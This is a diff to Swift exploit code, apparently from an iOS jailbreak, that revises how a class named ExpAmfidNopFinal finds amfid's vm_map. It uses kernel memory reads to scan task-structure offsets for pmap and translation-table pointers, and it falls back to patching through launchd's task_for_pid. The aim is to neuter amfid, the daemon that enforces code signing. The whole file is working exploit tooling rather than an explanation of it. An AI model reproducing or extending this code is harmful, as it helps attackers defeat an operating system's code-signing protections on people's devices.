@@ -185,39 +185,59 @@ final class ExpAmfidNopFinal {
             return
         }
         
-        // Read vm_map — use off_task_map from offsets (may be 0x28)
-        // If that fails, scan nearby offsets
-        var vmMap = ds_kread64(amfidTask + UInt64(off_task_map))
-        log("  vm_map (task+0x\(String(format:"%x", off_task_map))): 0x\(String(format:"%llx", vmMap))")
+        // Read vm_map — use off_task_map from offsets
+        // If that fails, scan nearby offsets with multiple pmap offset candidates
+        var vmMap: UInt64 = 0
+        let taskMapOff = UInt64(off_task_map)
+        let candidate0 = ds_kread64(amfidTask + taskMapOff)
+        log("  vm_map (task+0x\(String(format:"%x", taskMapOff))): 0x\(String(format:"%llx", candidate0))")
         
-        if vmMap == 0 || (vmMap >> 32) <= 0xFFFFFF00 {
-            log("  ⚠️ vm_map invalid at off_task_map — scanning...")
-            // Scan task struct for valid kernel pointers that could be vm_map
-            var found = false
-            for off: UInt64 in stride(from: 0x20, to: 0x80, by: 8) {
+        if candidate0 != 0 && (candidate0 >> 32) > 0xFFFFFF00 {
+            vmMap = candidate0
+        } else {
+            log("  ⚠️ vm_map invalid at off_task_map — scanning task struct...")
+            // Scan task struct for valid kernel pointers
+            // Try multiple pmap offsets (0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70)
+            // and multiple text base offsets (0x10, 0x18, 0x20)
+            for off: UInt64 in stride(from: 0x20, to: 0x100, by: 8) {
                 let val = ds_kread64(amfidTask + off)
-                if val != 0 && (val >> 32) > 0xFFFFFF00 && val != amfidTask {
-                    // Check if this looks like a vm_map (has a valid pmap at +0x48)
-                    let possiblePmap = ds_kread64(val + 0x48)
-                    let hasTextBase = ds_kread64(val + 0x10)
-                    log("    task+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) (pmap@+0x48=0x\(String(format:"%llx", possiblePmap)), min@+0x10=0x\(String(format:"%llx", hasTextBase)))")
-                    if (possiblePmap >> 32) > 0xFFFFFF00 && hasTextBase >= 0x100000000 && hasTextBase < 0x280000000000 {
-                        log("    ✅ Looks like vm_map! (has valid pmap + text base)")
+                if val == 0 || (val >> 32) <= 0xFFFFFF00 || val == amfidTask { continue }
+                
+                // Check multiple pmap offsets within this candidate
+                for pmapOff: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78] {
+                    let possiblePmap = ds_kread64(val + pmapOff)
+                    if possiblePmap == 0 || (possiblePmap >> 32) <= 0xFFFFFF00 { continue }
+                    
+                    // Check if pmap has a valid ttep at +0x0 (physical address)
+                    let possibleTtep = ds_kread64(possiblePmap + 0x0)
+                    if possibleTtep > 0x800000000 && possibleTtep < 0x900000000 {
+                        log("    ✅ task+0x\(String(format:"%02x", off)) → pmap@+0x\(String(format:"%x", pmapOff))=0x\(String(format:"%llx", possiblePmap)) → ttep=0x\(String(format:"%llx", possibleTtep))")
                         vmMap = val
-                        found = true
                         break
                     }
                 }
+                if vmMap != 0 { break }
+                
+                // Also check if any offset has a userspace text base (0x100000000+)
+                for minOff: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
+                    let possibleMin = ds_kread64(val + minOff)
+                    if possibleMin >= 0x100000000 && possibleMin < 0x200000000 {
+                        log("    task+0x\(String(format:"%02x", off)) has text-like value at +0x\(String(format:"%x", minOff))=0x\(String(format:"%llx", possibleMin))")
+                    }
+                }
             }
-            if !found {
+            
+            if vmMap == 0 {
                 log("❌ Cannot find vm_map in task struct")
+                log("   Task struct layout unknown for this build")
+                log("   Falling back to launchd task_for_pid...")
                 performPatchViaLaunchd(amfidPid: amfidPid)
                 return
             }
         }
         
         guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
-            log("❌ vm_map invalid — offset may be wrong")
+            log("❌ vm_map invalid")
             performPatchViaLaunchd(amfidPid: amfidPid)
             return
         }
